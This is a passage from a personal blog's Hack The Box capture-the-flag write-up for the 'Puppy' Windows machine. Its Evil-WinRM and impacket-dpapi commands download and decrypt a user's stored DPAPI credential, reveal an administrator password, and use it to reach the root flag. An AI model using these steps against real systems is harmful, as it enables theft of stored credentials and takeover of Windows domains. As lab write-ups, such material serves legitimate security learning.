<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; ls -h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; attrib -H C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line">Not resetting system file - C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; attrib -S -H C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; download C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d---s-          3/8/2025   7:53 AM                Credentials</span><br><span class="line">d---s-          3/8/2025   7:40 AM                Crypto</span><br><span class="line">d-----          3/8/2025   7:40 AM                Internet Explorer</span><br><span class="line">d-----          3/8/2025   7:40 AM                Network</span><br><span class="line">d---s-          3/8/2025   7:40 AM                Protect</span><br><span class="line">d-----          5/8/2021   1:20 AM                Spelling</span><br><span class="line">d---s-         2/23/2025   2:35 PM                SystemCertificates</span><br><span class="line">d-----         2/23/2025   2:36 PM                Vault</span><br><span class="line">d-----          3/8/2025   7:52 AM                Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft&gt; cd windows</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\windows&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-r---          3/8/2025   7:40 AM                AccountPictures</span><br><span class="line">d-----          5/8/2021   1:20 AM                CloudStore</span><br><span class="line">d-r---          3/8/2025   7:40 AM                Libraries</span><br><span class="line">d-----          5/8/2021   1:20 AM                Network Shortcuts</span><br><span class="line">d-----          5/8/2021   1:20 AM                Printer Shortcuts</span><br><span class="line">d-r---          3/8/2025   7:40 AM                Recent</span><br><span class="line">d-r---          3/8/2025   7:40 AM                SendTo</span><br><span class="line">d-----          3/8/2025   7:52 AM                ServerManager</span><br><span class="line">d-r---          3/8/2025   7:40 AM                Start Menu</span><br><span class="line">d-----          5/8/2021   1:20 AM                Templates</span><br><span class="line">d-----          3/8/2025   8:01 AM                Themes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\windows&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d---s-          3/8/2025   7:53 AM                Credentials</span><br><span class="line">d---s-          3/8/2025   7:40 AM                Crypto</span><br><span class="line">d-----          3/8/2025   7:40 AM                Internet Explorer</span><br><span class="line">d-----          3/8/2025   7:40 AM                Network</span><br><span class="line">d---s-          3/8/2025   7:40 AM                Protect</span><br><span class="line">d-----          5/8/2021   1:20 AM                Spelling</span><br><span class="line">d---s-         2/23/2025   2:35 PM                SystemCertificates</span><br><span class="line">d-----         2/23/2025   2:36 PM                Vault</span><br><span class="line">d-----          3/8/2025   7:52 AM                Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft&gt; cd Protect</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect&gt; download S-1-5-21-1487982659-1829050783-2281216199-1107</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107 to S-1-5-21-1487982659-1829050783-2281216199-1107</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>

<h3 id="Impacket-this-papi"><a href="#Impacket-this-papi" class="headerlink" title="Impacket this papi!"></a>Impacket this papi!</h3><p>Now lets dump with <em>impacket-dpapi</em> and see what we have.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">konoha# impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password &#x27;ChefSteph2025!&#x27;</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[MASTERKEYFILE]</span><br><span class="line">Version     :        2 (2)</span><br><span class="line">Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407</span><br><span class="line">Flags       :        0 (0)</span><br><span class="line">Policy      : 4ccf1275 (1288639093)</span><br><span class="line">MasterKeyLen: 00000088 (136)</span><br><span class="line">BackupKeyLen: 00000068 (104)</span><br><span class="line">CredHistLen : 00000000 (0)</span><br><span class="line">DomainKeyLen: 00000174 (372)</span><br><span class="line"></span><br><span class="line">Decrypted key with User Key (MD4 protected)</span><br><span class="line">Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</span><br><span class="line">konoha# impacket-dpapi credential -f C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[CREDENTIAL]</span><br><span class="line">LastWritten : 2025-03-08 15:54:29+00:00</span><br><span class="line">Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)</span><br><span class="line">Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)</span><br><span class="line">Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)</span><br><span class="line">Target      : Domain:target=PUPPY.HTB</span><br><span class="line">Description :</span><br><span class="line">Unknown     :</span><br><span class="line">Username    : steph.cooper_adm</span><br><span class="line">Unknown     : FivethChipOnItsWay2025!</span><br></pre></td></tr></table></figure>
<p><img src="/img/Invincible.gif"></p>
<h2 id="So-It-is-how-it-is"><a href="#So-It-is-how-it-is" class="headerlink" title="So It is how it is"></a>So It is how it is</h2><p>Now we can try to evil-winrm on and get the flag.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">konoha# evil-winrm -i puppy.htb -u steph.cooper_adm -p &#x27;FivethChipOnItsWay2025!&#x27;</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents&gt; cd \Users\Administrator\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-ar---         8/19/2025   4:10 PM             34 root.txt</span><br></pre></td></tr></table></figure>

<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/GenericAll/">GenericAll</a><a class="post-meta__tags" href="/tags/DPAPI/">DPAPI</a></div><div class="post-share"><div class="social-share" data-image="/img/puppy.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/23/Scepter/" title="Scepter (Windows Hard)"><img class="cover" src="/img/scepter.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Scepter (Windows Hard)</div></div><div class="info-2"><div class="info-item-1"> Initial Nmap found a NFS containing pfx keys and a key file and a cert file. By use pfx2john and creating a hash we crack the password. Then creating a pfx file using the cracked password with openssl. Then we auth and recieve d.baker hash. After getting a bloodhound dump we see d.baker has ForceChangePassword over a.carter. After doing so, we see a.carter has GenericAll over the Staff Access Certificate. Using dacledit.py we give a.carter access. Then we set a mail attribute for d.baker to h.brown@scepter.htb using bloodyAD. Then request again using upn h.brown. From there we can auth and recieve h.brownâ€˜s hash as well as ccache we can export and use. We have write over p.adams account and if we look at h.brown attributes we see altSecurityIdentities. This is weak encryption and we can set this attribute to p.adams and then set d.baker mail attribute to p.adams. Once done we request again using upn p.adams. This get us the hash for p.adams, from here we are a Replication Operator...</div></div></div></a><a class="pagination-related" href="/2025/05/10/Sauna/" title="Sauna (Windows Easy)"><img class="cover" src="/img/sauna.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Sauna (Windows Easy)</div></div><div class="info-2"><div class="info-item-1"> This box start off with port 80 open. Enumeration of the website returns users upon a page. Kerberoasting proves successful as you retrieve the hash of user fsmith. Once the hash is cracked we are able to gain access to the machine. Doing the steps to escalate privilege we come across cached credentials used by WinLogon found in Registry for user svc_loanmanager, we get the credentials using PowerShell. After looking at the user in Bloodhound, we find the user has GetChangesAll to the domain. This allows the user to DCSync and dump all the hashes for the domain. Initial Nmap12345678910111213141516171819PORT     STATE SERVICE       REASON          VERSION                                   53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus                           80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0                  |_http-title: Egotistical Bank :: Home                                                | http-methods:                       ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping ðŸ”ðŸ”</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-are-we-doing-as-the-KING"><span class="toc-number">2.</span> <span class="toc-text">What are we doing as the KING</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-to-know-one-another-%F0%9F%98%91"><span class="toc-number">3.</span> <span class="toc-text">Getting to know one another ðŸ˜‘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-were-you-hiding"><span class="toc-number">4.</span> <span class="toc-text">What were you hiding??</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Show-me-your-moves"><span class="toc-number">5.</span> <span class="toc-text">Show me your moves!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Silver-Surfing"><span class="toc-number">6.</span> <span class="toc-text">Silver Surfing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Backup-Files-suck-dude"><span class="toc-number">6.1.</span> <span class="toc-text">Backup Files suck dude!!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lets-get-intersteller-coop"><span class="toc-number">7.</span> <span class="toc-text">Lets get intersteller coop!!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Impacket-this-papi"><span class="toc-number">7.1.</span> <span class="toc-text">Impacket this papi!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#So-It-is-how-it-is"><span class="toc-number">8.</span> <span class="toc-text">So It is how it is</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>